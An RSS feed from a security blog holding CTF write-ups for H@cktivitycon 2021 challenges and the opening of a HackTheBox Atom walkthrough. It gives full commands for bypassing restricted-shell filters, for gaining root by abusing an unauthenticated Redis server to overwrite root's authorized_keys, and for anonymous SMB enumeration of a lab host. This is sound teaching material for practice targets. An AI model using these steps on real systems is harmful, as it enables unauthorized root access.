<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Redis on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/redis/</link>
    <description>Recent content in Redis on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 04 Oct 2021 02:50:12 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/redis/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>H@cktivitycon 2021 CTF - Miscellaneous</title>
      <link>https://fahmifj.github.io/ctf/hacktivitycon-2021-misc/</link>
      <pubDate>Mon, 04 Oct 2021 02:50:12 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hacktivitycon-2021-misc/</guid>
      <description>This is my late writeups for H@cktivitycon 2021 miscellaneous category.</description>
      <content:encoded><![CDATA[<p>So, in mid September 2021, I participated in the H@cktivitycon 2021 CTF. The event was hosted by HackerOne and lasted for two days.</p>
<p>A bit late but in this post, I&rsquo;ll share my writeups/solutions for three Miscellaneous category challenges that I solved.</p>
<p>I signed up earlier but only played the main challenges in the last few hours, which I now regret because there were so many fantastic challenges ðŸ˜…ðŸ”¨</p>
<h2 id="easy">Easy</h2>
<h3 id="badwords">Badwords</h3>
<h4 id="description">Description</h4>
<blockquote>
<p>You look questionable&hellip; if you don&rsquo;t have anything good to say, don&rsquo;t say anything at all!</p>
</blockquote>
<h4 id="walkthrough">Walkthrough</h4>
<p>When connecting, I can assume that it&rsquo;s not in a proper TTY, maybe a kind of wrapper shell. Each command I sent returns with the same message telling that it was a bad word.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ rlwrap nc -v challenge.ctf.games <span class="m">32559</span>
Connection to challenge.ctf.games <span class="m">32559</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>-1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
user@host:/home/user$ ls -l
ls -l
You said a bad word, <span class="s2">&#34;l&#34;</span>!!
user@host:/home/user$ <span class="nb">echo</span> <span class="nv">$0</span>
<span class="nb">echo</span> <span class="nv">$0</span>
You said a bad word, <span class="s2">&#34;echo&#34;</span>!!
</code></pre></div><p>But if I send a command separator, it returns a syntax error (notice the <code>;'</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="p">;</span>ls
<span class="p">;</span>ls
bash: syntax error near unexpected token <span class="sb">`</span><span class="p">;</span><span class="err">&#39;</span>
user@host:/home/user$
</code></pre></div><p>Now if I send a command enclosed with a single quote, I get the expected results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;whoami&#39;</span>
<span class="s1">&#39;whoami&#39;</span>
user
</code></pre></div><p>And adding an arg returns a different error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls -l&#39;</span>
<span class="s1">&#39;ls -l&#39;</span>
bash: ls -l: <span class="nb">command</span> not found
</code></pre></div><p>But if I separate the args, it returns with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
<span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 just
</code></pre></div><p>Now I can just do a recursive <code>ls</code> to find the flag and read it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
<span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
just:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 out

just/out:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 of

just/out/of:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 reach

just/out/of/reach:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> user user <span class="m">38</span> Sep  <span class="m">9</span> 19:47 flag.txt
user@host:/home/user$ <span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
<span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
flag<span class="o">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span class="o">}</span>user@host:/home/user$
</code></pre></div><h2 id="medium">Medium</h2>
<h3 id="shelle">Shelle</h3>
<h4 id="description-1">Description</h4>
<blockquote>
<p>Professor Shelle created a custom psuedo shell for us to learn Linux,  she believes it&rsquo;s safe and no one can ever read the flag. Can you prove  her wrong?*</p>
</blockquote>
<h4 id="walkthrough-1">Walkthrough</h4>
<p>This challenge is another shell wrapper like badwords. Upon connected, I was provided with the following menu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ rlwrap nc challenge.ctf.games <span class="m">32217</span>

Welcome to Shelle, a custom psuedo shell utility created by Professor Shelle in order to teach students about Linux terminals
Shelle is a restricted environment to prevent any misuse, Please Enter <span class="s1">&#39;HELP&#39;</span> to know about available features, happy learning !

root@pshelle$ HELP
HELP

Here is the list of <span class="nb">command</span> availiable to Students
1&gt; whoami
2&gt; <span class="nb">pwd</span>
3&gt; ls
4&gt; ps
5&gt; id
6&gt; <span class="nb">echo</span>
7&gt; cat


root@shelle$
</code></pre></div><p>When I use the <code>ls</code> command, I didn&rsquo;t find any flag in the current working directory. It seems I have to find it somewhere in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls
ls
assignment.txt  bin
</code></pre></div><p>So the first thing I tried was to list the root directory with <code>ls -l /</code>, but it turned out some characters, including <code>/</code>, are flagged as illegal. Luckily, <code>$</code>, <code>(</code>, <code>)</code>, <code>&quot;</code>, and <code>\</code> are not, so I can use the <code>echo</code> command with <code>-e</code> option within a subshell to print <code>\x2f</code> which is a <code>/</code> in Hex form.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
</code></pre></div><p>After wandering around, I found the flag on <code>/opt/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
total <span class="m">24</span>
-rwxr-xr-x <span class="m">1</span> shelle shelle <span class="m">17312</span> Sep  <span class="m">9</span> 19:33 binary
-r--r--r-- <span class="m">1</span> root   root      <span class="m">38</span> Sep  <span class="m">9</span> 19:33 flag.txt

root@shelle$ cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
flag<span class="o">{</span>82ad133488ad326eaf2120e03253e5d7<span class="o">}</span>
</code></pre></div><blockquote>
<p><strong>Note</strong>: I added a space after the shell prompt for readability and syntax highlighting.</p>
</blockquote>
<h3 id="redlike">Redlike</h3>
<h4 id="description-2">Description</h4>
<blockquote>
<p>You know, I like the color red. Primary colors are the best colors &ndash; you can do so much with them!</p>
<p>Escalate your privileges and retrieve the flag out of <code>root</code>&rsquo;s home directory.</p>
</blockquote>
<h4 id="walkthrough-2">Walkthrough</h4>
<p>For this challenge, there was a set of credentials given for SSH login into a VM instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ ssh -p <span class="m">31464</span> user@challenge.ctf.games
user@challenge.ctf.games<span class="s1">&#39;s password:
</span><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span><span class="s1">
</span><span class="s1"> * Documentation:  https://help.ubuntu.com
</span><span class="s1"> * Management:     https://landscape.canonical.com
</span><span class="s1"> * Support:        https://ubuntu.com/advantage
</span><span class="s1">
</span><span class="s1">This system has been minimized by removing packages and content that are
</span><span class="s1">not required on a system that users do not log into.
</span><span class="s1">
</span><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user@redlike-a6548218fe17631b-b75878d5-qsl75:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
</code></pre></div><p>At the root directory, I found <code>.docker-entrypoint</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -lah
total 72K
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 .
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 ..
-rwxr-xr-x    <span class="m">1</span> root root   <span class="m">61</span> Sep <span class="m">16</span> 14:43 .docker-entrypoint
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 bin -&gt; usr/bin
drwxr-xr-x    <span class="m">2</span> root root 4.0K Apr <span class="m">15</span>  <span class="m">2020</span> boot
drwxr-xr-x    <span class="m">5</span> root root  <span class="m">360</span> Sep <span class="m">18</span> 11:34 dev
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 etc
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:43 home
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 lib -&gt; usr/lib
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib32 -&gt; usr/lib32
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib64 -&gt; usr/lib64
lrwxrwxrwx    <span class="m">1</span> root root   <span class="m">10</span> Aug <span class="m">27</span> 07:16 libx32 -&gt; usr/libx32
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 media
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 mnt
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 opt
dr-xr-xr-x <span class="m">2595</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:34 proc
drwx------    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 root
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 run
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">8</span> Aug <span class="m">27</span> 07:16 sbin -&gt; usr/sbin
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 srv
dr-xr-xr-x   <span class="m">12</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:33 sys
drwxrwxrwt    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 tmp
drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:16 usr
drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:27 var
</code></pre></div><p>Based on the contents of the file and the name of the challenge, it&rsquo;s clear that the privesc has something to do with Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ cat .docker-entrypoint
<span class="c1">#!/bin/bash</span>

/etc/init.d/redis-server start
/usr/sbin/sshd -D
</code></pre></div><p>I can connect to the Redis server using <code>redis-cli</code> without authentication. I started the enumeration by sending <code>INFO</code> command, but under <code># Keyspace</code>, I found no active database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ which redis-cli
/usr/bin/redis-cli
user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ redis-cli
127.0.0.1:6379&gt; INFO
<span class="c1"># Server</span>
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:636cde3b5c7a3923
redis_mode:standalone
os:Linux 5.4.120+ x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.2.1
process_id:15
run_id:f5d6504f95159db85bb78e1bd786b2f3171564fd
tcp_port:6379
uptime_in_seconds:344
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:4575234
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

<span class="c1"># Clients</span>
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

<span class="c1"># Memory</span>
used_memory:859152
used_memory_human:839.02K
used_memory_rss:6017024
used_memory_rss_human:5.74M
used_memory_peak:859152
used_memory_peak_human:839.02K
used_memory_peak_perc:100.12%
used_memory_overhead:845926
used_memory_startup:796232
used_memory_dataset:13226
used_memory_dataset_perc:21.02%
allocator_allocated:1575864
allocator_active:1847296
allocator_resident:9879552
total_system_memory:33678073856
total_system_memory_human:31.37G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.17
allocator_frag_bytes:271432
allocator_rss_ratio:5.35
allocator_rss_bytes:8032256
rss_overhead_ratio:0.61
rss_overhead_bytes:-3862528
mem_fragmentation_ratio:7.36
mem_fragmentation_bytes:5199880
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

<span class="c1"># Persistence</span>
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1631964842
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

<span class="c1"># Stats</span>
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:31
total_net_output_bytes:11468
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

<span class="c1"># Replication</span>
role:master
connected_slaves:0
master_replid:f4b741e04432090f4eba3ef1fbdb2ce11e405aeb
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

<span class="c1"># CPU</span>
used_cpu_sys:0.271186
used_cpu_user:0.278797
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

<span class="c1"># Cluster</span>
cluster_enabled:0

<span class="c1"># Keyspace</span>
127.0.0.1:6379&gt;
</code></pre></div><p>The next thing I tried was writing a file to <code>/tmp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /tmp
OK
127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename choropys.php
OK
127.0.0.1:6379&gt; <span class="nb">set</span> <span class="nb">test</span> <span class="s2">&#34;choropys&#34;</span>
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt;
</code></pre></div><p>I exited from <code>redis-cli</code> and immediately checked the file I wrote under <code>/tmp</code>. It&rsquo;s there and the owner is root!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -l /tmp/choropys.php
-rw-rw---- <span class="m">1</span> root root <span class="m">112</span> Sep <span class="m">18</span> 11:45 /tmp/choropys.php
</code></pre></div><p>This arbitrary file write lack the execute permissions, but I remember from Hack The Box Postman that it is possible to use this to overwite the SSH <code>authorized_keys</code> file (see <a href="https://0xdf.gitlab.io/2020/03/14/htb-postman.html">this writeup</a> by 0xdf). So I can try to ovewrite the root&rsquo;s <code>authorized_keys</code> file.</p>
<p>First, I need to generate a pair of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ mkdir .ssh
user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key <span class="o">(</span>/home/user/.ssh/id_rsa<span class="o">)</span>:
Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>:
Enter same passphrase again:
Your identification has been saved in /home/user/.ssh/id_rsa
Your public key has been saved in /home/user/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:AVk3h1vdyP/x1KCcBr/IQY7eac9vzZUUrMx/pNkB0KI user@redlike-20edff3e85f553f2-55b895664b-szch7
The key<span class="err">&#39;</span>s randomart image is:
+---<span class="o">[</span>RSA 3072<span class="o">]</span>----+
<span class="p">|</span>      .o. oo+o.o <span class="p">|</span>
<span class="p">|</span>      .. .++.o<span class="o">=</span>o.<span class="p">|</span>
<span class="p">|</span>        .+.*+oooo<span class="p">|</span>
<span class="p">|</span>        .E+ *+ +<span class="o">=</span><span class="p">|</span>
<span class="p">|</span>       .So <span class="o">=</span> .o**<span class="p">|</span>
<span class="p">|</span>        . * . oo*<span class="p">|</span>
<span class="p">|</span>         . o   oo<span class="p">|</span>
<span class="p">|</span>            o . o<span class="p">|</span>
<span class="p">|</span>             o.  <span class="p">|</span>
+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</code></pre></div><p>Then I will have to wrap the SSH public key with two extra newlines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ <span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; spaced_key.txt
</code></pre></div><p>Now the key can be stored in Redis using the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ cat spaced_key.txt <span class="p">|</span> redis-cli -x <span class="nb">set</span> spaced_key.txt
OK
</code></pre></div><p>Then I can just set the database file name to  <code>authorized_keys</code> and save that under <code>/root/.ssh/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ redis-cli
127.0.0.1:6379&gt; config <span class="nb">set</span> dir /root/.ssh
OK
127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt;
</code></pre></div><p>And it worked, I can SSH login as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh root@redlike-20edff3e85f553f2-55b895664b-szch7
The authenticity of host <span class="s1">&#39;redlike-20edff3e85f553f2-55b895664b-szch7 (10.112.8.36)&#39;</span> can<span class="s1">&#39;t be established.
</span><span class="s1">ECDSA key fingerprint is SHA256:m9vzgGyWcCXB1tg0uLHYCKCaDNZFUnbeSirAvvLkYxU.
</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span class="s1">Warning: Permanently added &#39;</span>redlike-20edff3e85f553f2-55b895664b-szch7,10.112.8.36<span class="s1">&#39; (ECDSA) to the list of known hosts.
</span><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span><span class="s1">
</span><span class="s1"> * Documentation:  https://help.ubuntu.com
</span><span class="s1"> * Management:     https://landscape.canonical.com
</span><span class="s1"> * Support:        https://ubuntu.com/advantage
</span><span class="s1">
</span><span class="s1">This system has been minimized by removing packages and content that are
</span><span class="s1">not required on a system that users do not log into.
</span><span class="s1">
</span><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@redlike-20edff3e85f553f2-55b895664b-szch7:~# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@redlike-20edff3e85f553f2-55b895664b-szch7:~# ls -l
total <span class="m">4</span>
--w------- <span class="m">1</span> root root <span class="m">39</span> Sep <span class="m">16</span> 14:43 flag.txt
root@redlike-20edff3e85f553f2-55b895664b-szch7:~# cat flag.txt
flag<span class="o">{</span>69dc14707af23b728ebd1363715ec890<span class="o">}</span>
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Atom</title>
      <link>https://fahmifj.github.io/hackthebox/atom/</link>
      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/atom/</guid>
      <description>Supplying a malicious update definition to Electron-updater</description>
      <content:encoded><![CDATA[<p>Atom brings a cool exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. With write access, a malicious update definition can be placed on the share. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploitation of Electron-Builder app through auto-update.</li>
<li>Redis enumeration</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Msfvenom</li>
<li>Netcat</li>
<li>Impacket</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 07:56 EDT
Nmap scan report <span class="k">for</span> 10.10.10.237
Host is up, received echo-reply ttl <span class="m">127</span> <span class="o">(</span>0.051s latency<span class="o">)</span>.
Not shown: <span class="m">65529</span> filtered ports
Reason: <span class="m">65529</span> no-responses
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
135/tcp  open  msrpc        syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
443/tcp  open  ssl/http     syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
445/tcp  open  microsoft-ds syn-ack ttl <span class="m">127</span> Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
5985/tcp open  http         syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
6379/tcp open  redis        syn-ack ttl <span class="m">127</span> Redis key-value store
Service Info: Host: ATOM<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 153.92 seconds
</code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
<p>On Redis, authenticated is required.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«smbÂ» Â«10.10.14.49Â» 
$ nc -nv 10.10.10.237 <span class="m">6379</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>?<span class="o">)</span> open
INFO
-NOAUTH Authentication required.
</code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ crackmapexec smb 10.10.10.237 -u <span class="s1">&#39;ANONYMOUS&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Pro <span class="m">19042</span> x64 <span class="o">(</span>name:ATOM<span class="o">)</span> <span class="o">(</span>domain:ATOM<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> ATOM<span class="se">\A</span>NONYMOUS: 
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
SMB         10.10.10.237    <span class="m">445</span>    ATOM             Share           Permissions     Remark
SMB         10.10.10.237    <span class="m">445</span>    ATOM             -----           -----------     ------
SMB         10.10.10.237    <span class="m">445</span>    ATOM             ADMIN$                          Remote Admin
SMB         10.10.10.237    <span class="m">445</span>    ATOM             C$                              Default share
SMB         10.10.10.237    <span class="m">445</span>    ATOM             IPC$                            Remote IPC
SMB         10.10.10.237    <span class="m">445</span>    ATOM             Software_Updates READ,WRITE      
</code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ root@kali Â«atomÂ» Â«10.10.14.49Â» 
$ smbclient -N //10.10.10.237/Software_Updates
Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> dir
  .                                   D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  ..                                  D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  client1                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  client2                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
